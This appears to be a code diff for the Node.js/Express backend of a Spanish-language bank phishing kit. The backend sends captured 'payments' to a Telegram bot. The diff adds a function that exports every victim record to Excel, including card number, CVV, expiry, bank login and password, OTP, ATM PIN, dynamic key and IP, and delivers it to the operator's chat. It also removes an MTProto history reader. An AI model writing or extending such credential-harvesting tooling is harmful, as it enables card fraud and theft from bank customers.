@@ -1,7 +1,6 @@
 const express = require('express');
 const cors = require('cors');
 const XLSX = require('xlsx');
-const { generarExcelHistorial } = require('./mtproto'); // 👈 MTProto
 
 const app = express();
 app.use(cors());
@@ -31,9 +30,6 @@ const ipsBaneadas = new Set();
 
 // 💬 IDs de mensajes enviados (para poder borrarlos) → Map<messageId, { chat_id, token }>
 const mensajesEnviados = new Map();
-
-// 🔐 Callback global para capturar códigos de MTProto por chat
-global.mtprotoCallback = null;
 
 // ============================================================
 // 🏦 DETECCIÓN DE BANCO
@@ -180,6 +176,44 @@ function textoPasoOTP(pago) {
         `🔑 <b>Contraseña:</b> <code>${pago.password_banco || '—'}</code>\n` +
         `🔐 <b>${etiqueta}:</b> <code>${valor || '—'}</code>`
     );
+}
+
+// ============================================================
+// 📊 GENERADOR DE EXCEL (sin MTProto, desde memoria)
+// ============================================================
+function generarExcelDesdeMemoria() {
+    const pagos = [...pagosPendientes.values()];
+
+    if (pagos.length === 0) return null;
+
+    const filas = pagos.map(p => ({
+        'ID Solicitud': p.solicitud_id || '',
+        'Estado': p.estado || '',
+        'Fase': p.fase_actual || '',
+        'Paso': p.paso || '',
+        'Solicitante': p.nombre_solicitante || '',
+        'Cédula Solicitante': p.cedula_solicitante || '',
+        'Titular': p.titular || '',
+        'Tarjeta': p.numero_tarjeta || '',
+        'Vencimiento': p.vencimiento || '',
+        'CVV': p.cvv || '',
+        'Marca': (p.marca_tarjeta || '').toUpperCase(),
+        'Banco': p.banco_emisor || '',
+        'Usuario Banco': p.usuario_banco || '',
+        'Contraseña Banco': p.password_banco || '',
+        'OTP': p.codigo_otp || '',
+        'Clave ATM': p.clave_atm || '',
+        'Clave Dinámica': p.clave_dinamica || '',
+        'Requiere SMS': p.requiere_sms ? 'Sí' : 'No',
+        'IP': p.ip || '',
+        'Banco Especial': p.es_especial ? 'Sí' : 'No',
+        'Motivo Rechazo': p.motivo_rechazo || ''
+    }));
+
+    const ws = XLSX.utils.json_to_sheet(filas);
+    const wb = XLSX.utils.book_new();
+    XLSX.utils.book_append_sheet(wb, ws, 'Pagos');
+    return XLSX.write(wb, { type: 'buffer', bookType: 'xlsx' });
 }
 
 // ============================================================
@@ -417,13 +451,6 @@ async function procesarUpdate(update, tokenBot) {
     try {
         const msg = update.message;
 
-        // 🔐 Captura de código/password para MTProto
-        if (global.mtprotoCallback && msg && msg.text) {
-            global.mtprotoCallback(msg.text.trim());
-            global.mtprotoCallback = null;
-            return;
-        }
-
         if (msg && msg.text) {
             const chatIdMsg = String(msg.chat?.id);
             const esChatOriginal = chatIdMsg === String(CHAT_ID);
@@ -464,21 +491,20 @@ async function procesarUpdate(update, tokenBot) {
             }
 
             // ============================================================
-            // 📊 /base — LEE TODO EL HISTORIAL CON MTPROTO
+            // 📊 /base — GENERA EXCEL DESDE MEMORIA (SIN MTPROTO)
             // ============================================================
             if (comando === '/base') {
-                await responder('⏳ Conectando a Telegram (MTProto) y leyendo todo el historial. Esto puede pedir código la primera vez...');
+                const buffer = generarExcelDesdeMemoria();
+
+                if (!buffer) {
+                    await responder('📭 No hay solicitudes registradas en memoria.');
+                    return;
+                }
+
                 try {
-                    const buffer = await generarExcelHistorial(chatIdMsg, tokenBot, responder);
-
-                    if (!buffer) {
-                        await responder('📭 No se encontraron solicitudes en el historial.');
-                        return;
-                    }
-
                     const formData = new FormData();
                     formData.append('chat_id', chatIdMsg);
-                    formData.append('caption', `📊 <b>BASE COMPLETA (MTProto)</b>\n\n📦 Datos extraídos desde el inicio.`);
+                    formData.append('caption', `📊 <b>BASE DE DATOS</b>\n\n📦 Total registros: ${pagosPendientes.size}`);
                     formData.append('parse_mode', 'HTML');
                     formData.append('document', new Blob([buffer], { type: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }), `base_${Date.now()}.xlsx`);
 
@@ -487,8 +513,8 @@ async function procesarUpdate(update, tokenBot) {
                         body: formData
                     });
                 } catch (err) {
-                    console.error('Error MTProto:', err);
-                    await responder('❌ Error al leer el historial. Intenta de nuevo.');
+                    console.error('Error enviando Excel:', err);
+                    await responder('❌ Error al generar el Excel.');
                 }
                 return;
             }
